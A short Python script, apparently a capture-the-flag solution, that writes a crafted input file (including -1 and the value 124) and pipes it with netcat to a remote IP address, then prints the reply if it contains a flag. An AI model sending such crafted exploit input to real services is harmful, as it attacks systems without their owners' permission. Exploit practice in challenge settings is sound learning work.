import os

for j in range(1):
    j = 124
    f = open("test.txt", 'w')
    f.write('-1\n')
    for i in range(36):
        f.write('1\n')
    f.write(str(j) + "\n")

    f.write('0\n')
    f.close()

    print(str(j))
    os.system("cat test.txt | nc 3.1.141.4 24242 > out.txt")

    f = open("out.txt", 'r')
    result = f.read()
    f.close()
    if 'flag' in result:
        print(result)

